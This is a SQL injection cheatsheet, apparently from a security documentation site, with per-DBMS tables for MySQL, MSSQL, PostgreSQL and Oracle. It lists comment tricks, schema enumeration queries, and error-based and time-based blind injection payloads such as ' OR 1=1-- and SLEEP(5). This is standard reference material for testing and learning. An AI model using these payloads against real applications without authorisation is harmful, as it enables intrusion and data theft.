---
title: 'SQL Injection Cheatsheet'
description: 'Quick reference tables for MySQL, MSSQL, PostgreSQL, and Oracle.'
icon: material/file-document-outline
tags:
  - sql-injection
  - cheatsheet
  - reference
---

# SQL Injection Cheatsheet

A quick reference guide for manual SQL injection across the four most common Database Management Systems (DBMS).

---

## 1. Comments

Comments are essential for terminating the injected query and neutralizing the remaining legitimate SQL code.

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `-- ` (space required), `#`, `/* */` | `' OR 1=1-- ` |
| **MSSQL** | `--`, `/* */` | `' OR 1=1--` |
| **PostgreSQL**| `--`, `/* */` | `' OR 1=1--` |
| **Oracle** | `--` | `' OR 1=1--` |

---

## 2. String Concatenation

String concatenation is useful for bypassing filters, fingerprinting the database, or combining multiple columns into a single visible output.

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `CONCAT()`, `'a' 'b'` | `CONCAT('foo', 'bar')` |
| **MSSQL** | `+` | `'foo' + 'bar'` |
| **PostgreSQL**| `||` | `'foo' || 'bar'` |
| **Oracle** | `||`, `CONCAT()` | `'foo' || 'bar'` |

---

## 3. Substrings

Substring functions are crucial for Boolean-based and Time-based blind SQL injection to extract data one character at a time.

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `SUBSTRING()`, `SUBSTR()`, `MID()` | `SUBSTRING('foobar', 1, 1)` -> `f` |
| **MSSQL** | `SUBSTRING()` | `SUBSTRING('foobar', 1, 1)` -> `f` |
| **PostgreSQL**| `SUBSTRING()`, `SUBSTR()` | `SUBSTRING('foobar', 1, 1)` -> `f` |
| **Oracle** | `SUBSTR()` | `SUBSTR('foobar', 1, 1)` -> `f` |

---

## 4. Length

Used in blind SQL injection to determine the length of a string before extracting it.

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `LENGTH()`, `CHAR_LENGTH()` | `LENGTH('foo')` -> `3` |
| **MSSQL** | `LEN()` | `LEN('foo')` -> `3` |
| **PostgreSQL**| `LENGTH()`, `CHAR_LENGTH()` | `LENGTH('foo')` -> `3` |
| **Oracle** | `LENGTH()` | `LENGTH('foo')` -> `3` |

---

## 5. System Information (Recon)

Extracting the version, current user, and current database.

| Goal | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| **Version** | `@@version`, `version()` | `@@version` | `version()` | `SELECT banner FROM v$version` |
| **Current User** | `user()`, `current_user` | `user`, `SYSTEM_USER` | `user`, `current_user` | `user` |
| **Current DB** | `database()` | `DB_NAME()` | `current_database()`| `name FROM V$DATABASE` |

---

## 6. Database Enumeration (UNION)

Queries used to list all databases, tables, and columns via `UNION SELECT`.

### MySQL / PostgreSQL / MSSQL (Information Schema)

These three systems support the standard `information_schema`.

| Goal | Query Structure |
|---|---|
| **List Databases** | `SELECT schema_name FROM information_schema.schemata` |
| **List Tables** | `SELECT table_name FROM information_schema.tables WHERE table_schema='db_name'` |
| **List Columns** | `SELECT column_name FROM information_schema.columns WHERE table_name='table_name'` |

### Oracle

Oracle uses a different system catalog.

| Goal | Query Structure |
|---|---|
| **List Databases** | `SELECT DISTINCT owner FROM all_tables` |
| **List Tables** | `SELECT table_name FROM all_tables WHERE owner='DB_NAME'` |
| **List Columns** | `SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME'` |

---

## 7. Time Delay Functions

Functions used for Time-Based Blind SQL injection.

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `SLEEP()` | `SLEEP(5)` |
| **MSSQL** | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:5'` |
| **PostgreSQL**| `pg_sleep()` | `pg_sleep(5)` |
| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE`| `DBMS_PIPE.RECEIVE_MESSAGE('a',5)`|

---

## 8. Error-Based Payloads

Common payloads to trigger verbose errors containing data.

| DBMS | Payload Example |
|---|---|
| **MySQL** | `AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))` |
| **MSSQL** | `AND 1=CONVERT(int, (SELECT @@version))` |
| **PostgreSQL**| `AND 1=CAST((SELECT version()) AS int)` |
| **Oracle** | `AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1))` |

---

## 9. Boolean-Based Conditionals

Constructs for conditionally executing code (useful in time-based blind).

| DBMS | Syntax | Example |
|---|---|---|
| **MySQL** | `IF()` | `IF(1=1, SLEEP(5), 0)` |
| **MSSQL** | `IF ... ELSE ...`| `IF (1=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'` |
| **PostgreSQL**| `CASE WHEN` | `CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END` |
| **Oracle** | `CASE WHEN` | `CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END` |
